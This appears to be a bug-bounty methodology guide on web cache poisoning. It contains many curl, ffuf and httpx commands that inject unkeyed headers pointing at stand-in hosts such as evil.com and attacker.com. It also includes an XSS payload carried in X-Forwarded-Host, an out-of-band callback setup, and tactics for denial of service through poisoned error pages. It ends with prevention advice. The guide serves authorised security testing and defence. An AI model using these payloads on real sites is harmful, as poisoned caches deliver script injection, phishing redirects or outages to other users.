# Web Cache Poisoning

> Comprehensive web cache poisoning testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Web Cache Poisoning exploits discrepancies between what the backend processes and what the cache keys on — injecting malicious content (XSS, open redirect, JavaScript injection) via unkeyed inputs that gets stored and served to other users. Based on PortSwigger Research (Practical Web Cache Poisoning, Web Cache Entanglement), OWASP Cache Poisoning Cheat Sheet, PayloadsAllTheThings, and recent trends (internal framework poisoning like Next.js chains, parser discrepancies, header oversize/smuggling, CDN‑specific quirks, poisoned DoS via error pages).

## Methodology

### 1. Target & Cacheable Response Identification
- **Cacheable responses:** Static assets, pages with `Cache‑Control: public, max‑age>0, s‑maxage>0, immutable`, `ETag` / `Last‑Modified` present, `X‑Cache: HIT` (after repeat requests)
- **Weak Vary header:** Missing or insufficient (e.g., `Vary: Accept‑Encoding` but not `User‑Agent`)
- **Static‑like paths:** `/static/`, `/assets/`, `/js/`, `/css/`, homepage, error pages
- **Common cache layers:** Browser, CDN (Cloudflare, Akamai, Fastly), reverse proxy (Varnish, Nginx), app‑internal (Next.js, Rails, Laravel)

### 2. Unkeyed Input Discovery
- **Unkeyed headers:** `X‑Forwarded‑Host`, `X‑Forwarded‑Scheme`, `X‑Forwarded‑Proto`, `X‑Forwarded‑Port`, `X‑Host`, `X‑Original‑URL`, `X‑Rewrite‑URL` (Symfony), `Referer`, `Origin`, `User‑Agent`, `Accept` (if not part of cache key)
- **Unkeyed query parameters:** `?cb=123` ignored by cache key
- **Cookies:** If not hashed in key
- **HTTP method mismatches:** GET vs HEAD

### 3. Basic Probes & Detection
- **Confirm caching:** Send request twice; look for `X‑Cache: HIT` or faster response / same timestamp
- **Cache buster:** Use `?cb=random` or header `Cache‑Control: no‑cache` to force MISS for testing
- **Inject via suspect header:** e.g., `X‑Forwarded‑Host: attacker.com`; observe reflection in response (absolute URLs, redirects, script `src`)
- **Poison workflow:** Send payload once (ensure MISS) → request normally (HIT) → check if poisoned content served

### 4. Advanced Bypass Techniques (2025–2026)
- **Multi‑header chains:** `X‑Forwarded‑Host: attacker.com` + `X‑Forwarded‑Proto: http` → mixed‑content / downgrade
- **Header oversize / smuggling:** Oversized headers + smuggling → poison via normalization differences
- **URL delimiter tricks:** `/page/.js`, `/page/;.js`, `/page%3f.js`, `/page%20` (space ignored by cache)
- **Next.js / framework internals:** Spoof internal headers → force‑cache stale JSON as HTML → SXSS / DoS
- **CDN quirks:** Cloudflare Polish / Rocket Loader bypass, Akamai ESI injection, Varnish VCL mismatches
- **Blind / OOB:** Poison redirect → OAST callback, poisoned JS → beacon exfiltration

### 5. Chained Exploitation
- **Poison + XSS → stored XSS:** Inject malicious script via unkeyed header, cache serves to all users
- **Poison + open redirect → phishing:** Poisoned redirect location leads to malicious site
- **Poison + SSRF:** Inject internal host header to trigger SSRF from cached response
- **Poison + DoS:** Cache poisoned 404/error pages → mass DoS
- **Poison + cache deception:** Combine with web cache deception for hybrid attacks

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Cache‑poisoning‑specific tools
git clone https://github.com/RedSiege/WCVS.git  # Web Cache Vulnerability Scanner
git clone https://github.com/s0md3v/CacheKiller.git  # Detect URL parsing inconsistencies

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest

# Out‑of‑band detection
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

## Testing Commands

### 1. Basic Cache Poisoning Detection

```bash
# Test with X‑Forwarded‑Host and X‑Original‑URL
cat crawledurls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -H "X-Original-URL: /admin" -mc 200 | anew cache-poison-basic-hits.txt

# Detect caching headers
cat crawledurls.txt | httpx -silent -match-string "Cache-Control: public\|max-age\|s-maxage\|immutable" | anew cacheable-urls.txt

# Check for X‑Cache HIT
for url in $(cat cacheable-urls.txt); do
  curl -s -I "$url" | grep -i "X-Cache: HIT" && echo "Cached: $url"
done
```

### 2. Manual Testing with Curl

```bash
# Confirm caching
curl -I "http://target.com/page"
curl -I "http://target.com/page"  # Second request should be faster / X‑Cache: HIT

# Inject unkeyed header
curl -H "X-Forwarded-Host: evil.com" "http://target.com/page" -I | grep -i "evil.com"

# Poison workflow
curl -H "X-Forwarded-Host: evil.com" "http://target.com/page?cb=12345"  # Force MISS with cache buster
curl "http://target.com/page"  # Should reflect evil.com if poisoned

# Test other headers
curl -H "X-Original-URL: /admin" "http://target.com/page" -I
curl -H "X-Rewrite-URL: /evil" "http://target.com/page" -I
curl -H "X-Forwarded-Proto: http" "http://target.com/page" -I
```

### 3. Advanced Header Fuzzing

```bash
# Create header payloads
cat > cache-headers.txt << EOF
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 80
X-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /evil
Referer: https://evil.com
Origin: https://evil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json
EOF

# Fuzz with ffuf
ffuf -u https://target.com/page -H "FUZZ" -w /home/pwn/wordlists/cache-headers.txt -fr "evil.com" -o ffuf-cache-headers.txt

# Fuzz multiple URLs
cat cacheable-urls.txt | while read url; do
  ffuf -u "$url" -H "X-Forwarded-Host: evil.com" -fr "evil.com" -t 10
done
```

### 4. Unkeyed Query Parameter Detection

```bash
# Test if query parameters are keyed
curl "http://target.com/page?cb=12345" -I | grep -i "X-Cache: HIT"
curl "http://target.com/page?cb=67890" -I | grep -i "X-Cache: HIT"  # If HIT, parameter not keyed

# Automated detection with Param Miner (Burp extension) recommended
```

### 5. Poisoning with XSS Payloads

```bash
# Inject XSS via X‑Forwarded‑Host (if reflected in script src)
curl -H "X-Forwarded-Host: \"><script>alert(1)</script>" "http://target.com/page" | grep -q "<script>alert" && echo "XSS reflection"

# More subtle: poison JavaScript resource
curl -H "X-Forwarded-Host: attacker.com" "http://target.com/page" | grep -q "attacker.com" && echo "JS resource poisoning possible"
```

### 6. Cache Poisoning via URL Delimiters

```bash
# Test delimiter tricks
curl "http://target.com/page/.js" -I
curl "http://target.com/page/;.js" -I
curl "http://target.com/page%3f.js" -I
curl "http://target.com/page%20" -I

# Check if cache treats differently
curl -I "http://target.com/page/.js" | grep -i "X-Cache"
curl -I "http://target.com/page" | grep -i "X-Cache"
```

### 7. CDN‑Specific Quirks

```bash
# Cloudflare Polish / Rocket Loader detection
curl -H "CF‑Polish: off" "http://target.com/image.jpg" -I
curl -H "CF‑Rocket‑Loader: off" "http://target.com/page" -I

# Akamai ESI injection test
curl -H "Surrogate‑Capability: ESI/1.0" "http://target.com/page" -I
```

### 8. Blind / OOB Poisoning Detection

```bash
# Use interactsh for blind SSRF
INTERACTSH="https://YOUR_ID.oast.pro"
curl -H "X-Forwarded-Host: $INTERACTSH" "http://target.com/page?cb=12345"

# Monitor interactsh for callbacks
interactsh-client -l -o interactsh-log.txt
```

### 9. Next.js / Framework Internal Poisoning

```bash
# Next.js stale‑while‑revalidate poisoning
curl -H "Next‑Router‑State‑Tree: malicious" "http://target.com/_next/data/build/page.json" -I

# Poison JSON‑as‑HTML cache
curl -H "Accept: text/html" "http://target.com/api/data.json" -I
```

### 10. Nuclei Templates for Cache Poisoning

```bash
# Scan with nuclei cache‑poisoning templates
nuclei -u https://target.com -t ~/nuclei-templates/cache-poisoning/ -o nuclei-cache-poison.txt

# Use specific tags
nuclei -u https://target.com -tags cache-poisoning -o nuclei-cache-poison-tagged.txt
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Multi‑header chains:** Combine `X‑Forwarded‑Host` + `X‑Forwarded‑Proto` + `X‑Forwarded‑Port` for complex poisoning
- **Header oversize / smuggling:** Oversized headers cause parsing differences between cache and backend
- **URL delimiter discrepancies:** `/page/.js` vs `/page/;.js` vs `/page%3f.js` (cache may treat as same key)
- **Next.js internal poisoning:** Spoof `Next‑Router‑State‑Tree`, `Next‑Action`, `Next‑Data` headers to poison data cache
- **CDN‑specific quirks:** Cloudflare Polish, Rocket Loader, Akamai ESI, Varnish VCL mismatches
- **Blind OOB exfiltration:** Poison redirect to attacker‑controlled domain, monitor for callbacks
- **DoS via poisoned error pages:** Cache 404/500 pages with malicious content, cause mass DoS

## Detection & Verification

- **Unkeyed input reflected in response** – e.g., `evil.com` appears in absolute URLs, script `src`, redirect `Location`
- **X‑Cache: HIT on poisoned request** (without injected header) – cache stores poisoned content
- **Malicious content served** – alert popup, redirect to evil.com, JavaScript exfiltration
- **Mass impact** – Test from different IPs/browsers; poisoned content appears for all users
- **Blind indicators** – OAST callbacks, observable side‑effects (e.g., poisoned error page causes DoS)
- **PoC:** Screenshot of poisoned page, network capture showing X‑Cache HIT, demonstration of mass impact

## Prevention (Developer View – OWASP Latest)

1. **Strong cache keys** – Include all reflected inputs (headers like `X‑Forwarded‑Host` in `Vary`)
2. **Normalize / reject dangerous headers** – Strip / validate `X‑Forwarded‑*` headers
3. **Avoid dynamic absolute URLs** from untrusted sources – use relative URLs or trusted configuration
4. **Cache isolation** – Per‑user keys where possible (private cache)
5. **CDN configuration** – Strict `Vary`, ignore unsafe headers, disable caching on dynamic pages
6. **Disable caching** on dynamic / reflected pages – set `Cache‑Control: no‑store, no‑cache`
7. **WAF / rules** – Block oversize headers, smuggling patterns, malformed URLs
8. **Regular security testing** – Include web cache poisoning checks in CI/CD pipelines

## References

- **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/Web‑Cache‑Poisoning.md](../Web‑Vulnerability‑Testing‑Checklist/Web‑Cache‑Poisoning.md)
- **PortSwigger Web Cache Poisoning**: https://portswigger.net/web‑security/web‑cache‑poisoning
- **PortSwigger Practical Web Cache Poisoning**: https://portswigger.net/research/practical‑web‑cache‑poisoning
- **PortSwigger Web Cache Entanglement**: https://portswigger.net/research/web‑cache‑entanglement
- **OWASP Cache Poisoning**: https://owasp.org/www‑community/attacks/Cache_Poisoning
- **PayloadsAllTheThings – Web Cache Deception/Poisoning**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception
- **Recent 2025–2026 top techniques**: Next.js chains, parser discrepancies, poisoned DoS

> **Happy (ethical) hunting** — Web Cache Poisoning (especially chained/internal) remains a high‑impact bug in CDNs and frameworks in 2026!